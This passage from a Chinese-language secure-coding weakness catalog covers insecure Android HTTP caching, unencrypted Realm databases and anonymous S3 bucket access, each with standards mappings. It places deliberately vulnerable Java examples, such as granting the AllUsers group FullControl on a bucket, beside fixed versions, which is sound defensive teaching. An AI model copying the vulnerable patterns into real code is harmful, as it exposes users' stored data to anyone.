<h5 id="RECOMMENDATIONS-110"><a href="#RECOMMENDATIONS-110" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了防止第三方应用程序访问包含敏感数据的 HTTP(S) 响应，将缓存安装在专用的用户存储空间。</p>
<p>示例 2： 以下代码将 HTTP(S) 响应缓存安装在专用的用户空间：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">        File httpCacheDir = new File(context.getCacheDir(), &quot;http&quot;);</span><br><span class="line"></span><br><span class="line">        long httpCacheSize = 10 * 1024 * 1024; // 10 MiB</span><br><span class="line"></span><br><span class="line">        HttpResponseCache.install(httpCacheDir, httpCacheSize);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">        Log.i(TAG, &quot;HTTP response cache installation failed:&quot; + e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> protected void onStop() &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    HttpResponseCache cache = HttpResponseCache.getInstalled();</span><br><span class="line"></span><br><span class="line">    if (cache != null) &#123;</span><br><span class="line"></span><br><span class="line">        cache.flush();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-108"><a href="#REFERENCES-108" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311, CWE ID 312, CWE ID 313, CWE ID 522 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [13] CWE ID 287 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001350, CCI-002475 </p>
<p>[5] Standards Mapping - FIPS200 MP </p>
<p>[6] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.10.2 Service Authentication Requirements, 2.10.3 Service Authentication Requirements, 3.7.1 Defenses Against Session Management Exploits, 6.1.1 Data Classification, 6.1.2 Data Classification, 6.1.3 Data Classification, 6.2.1 Algorithms, 8.1.6 General Data Protection, 8.1.6 General Data Protection, 8.2.2 Client-side Data Protection, 9.2.3 Server Communications Security Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.3 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.3 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.3 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.3 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7.1 - Use of Cryptography </p>
<p>[20] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311 </p>
<p>[21] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311 </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-Missing-Database-Encryption"><a href="#Insecure-Storage-Missing-Database-Encryption" class="headerlink" title="Insecure Storage: Missing Database Encryption"></a>Insecure Storage: Missing Database Encryption</h4><h5 id="ABSTRACT-110"><a href="#ABSTRACT-110" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>所标识的方法建立到未加密数据库的连接。</p>
<h5 id="EXPLANATION-111"><a href="#EXPLANATION-111" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>应用程序文件可以由根设备上或未加密备份中的其他应用程序访问。由于用户可以决定越狱其设备或执行未加密的备份，因此最好对包含敏感数据的数据库进行加密。</p>
<p>示例 1：以下代码建立到未加密的 Realm 数据库的连接：</p>
<pre><code>`Realm realm = Realm.getDefaultInstance();`
</code></pre><h5 id="RECOMMENDATIONS-111"><a href="#RECOMMENDATIONS-111" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>根据用户配置，文件系统上的文件可以保持未加密状态。为了保护用户数据，最好对数据库进行加密。</p>
<p>示例 2：以下代码使用 Realm 数据库本机加密，这种加密使用 AES-256+SHA2 透明地保护静态数据库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RealmConfiguration realmConfiguration = new RealmConfiguration.Builder().encryptionKey(getKeyFromKeystore()).build();</span><br><span class="line"></span><br><span class="line">Realm realm = Realm.getInstance(realmConfiguration);</span><br></pre></td></tr></table></figure>
<p>要在单个设备上专门创建 Realm 文件以保证这些文件保留在设备上，最安全的方式将加密密钥保存到 Android Keystore。</p>
<h5 id="REFERENCES-109"><a href="#REFERENCES-109" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Realm Database Encryption Realm</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 311 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[5] Standards Mapping - FIPS200 MP </p>
<p>[6] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 6.2.1 Algorithms, 8.1.6 General Data Protection </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.3 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.3 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.3 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.3 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 6.3 - Sensitive Data Protection, Control Objective 7 - Use of Cryptography </p>
<p>[20] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311 </p>
<p>[21] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311 </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-S3-Full-Anonymous-Access"><a href="#Insecure-Storage-S3-Full-Anonymous-Access" class="headerlink" title="Insecure Storage: S3 Full Anonymous Access"></a>Insecure Storage: S3 Full Anonymous Access</h4><h5 id="ABSTRACT-111"><a href="#ABSTRACT-111" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序可授予对 AWS S3 存储桶或对象的完全匿名访问权限。</p>
<h5 id="EXPLANATION-112"><a href="#EXPLANATION-112" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>授予对存储桶或对象的完全匿名访问权限将允许攻击者读取内容或将其替换为恶意内容。</p>
<p>示例 1：以下代码设置的Access Control Policy可授予对 foo 存储桶的完全匿名访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">Grantee allusers = Grantee.builder().uri(&quot;http://acs.amazonaws.com/groups/global/AllUsers&quot;).build();</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;FullControl&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(allusers).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-112"><a href="#RECOMMENDATIONS-112" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终应用最小权限原则并授予程序所需的最小权限集。</p>
<p>示例 2：以下代码设置的Access Control Policy可基于用户的电子邮件地址授予对单个用户的完全访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">EmailAddressGrantee grantee = new EmailAddressGrantee(email);</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;FullControl&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(grantee).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-110"><a href="#REFERENCES-110" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 284, CWE ID 359 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.4.2 Access Control Architectural Requirements, 1.4.4 Access Control Architectural Requirements, 8.3.4 Sensitive Private Data, 10.2.1 Malicious Code Search </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.1 - Sensitive Data Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-S3-Read-ACP-Anonymous-Access"><a href="#Insecure-Storage-S3-Read-ACP-Anonymous-Access" class="headerlink" title="Insecure Storage: S3 Read ACP Anonymous Access"></a>Insecure Storage: S3 Read ACP Anonymous Access</h4><h5 id="ABSTRACT-112"><a href="#ABSTRACT-112" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序可授予匿名读取 AWS S3 存储桶或对象的访问控制策略 (ACP) 的权限。</p>
<h5 id="EXPLANATION-113"><a href="#EXPLANATION-113" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>授予匿名读取存储桶或对象的访问控制策略 (ACP) 的权限将允许攻击者发现可以检索或覆盖的对象。</p>
<p>示例 1：以下代码设置的Access Control Policy可授予对 foo 存储桶的匿名读取 ACP 访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">Grantee allusers = Grantee.builder().uri(&quot;http://acs.amazonaws.com/groups/global/AllUsers&quot;).build();</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;READ_ACP&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(allusers).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-113"><a href="#RECOMMENDATIONS-113" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终应用最小权限原则并授予程序所需的最小权限集。</p>
<p>示例 2：以下代码设置的Access Control Policy可基于用户的电子邮件地址授予对单个用户的访问控制策略 (ACP) 读取访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">EmailAddressGrantee grantee = new EmailAddressGrantee(email);</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;READ_ACP&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(grantee).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-111"><a href="#REFERENCES-111" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 284, CWE ID 359 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.4.2 Access Control Architectural Requirements, 1.4.4 Access Control Architectural Requirements, 8.3.4 Sensitive Private Data, 10.2.1 Malicious Code Search </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.1 - Sensitive Data Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-S3-Read-Anonymous-Access"><a href="#Insecure-Storage-S3-Read-Anonymous-Access" class="headerlink" title="Insecure Storage: S3 Read Anonymous Access"></a>Insecure Storage: S3 Read Anonymous Access</h4><h5 id="ABSTRACT-113"><a href="#ABSTRACT-113" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序可授予对 AWS S3 存储桶或对象的匿名读取访问权限。</p>
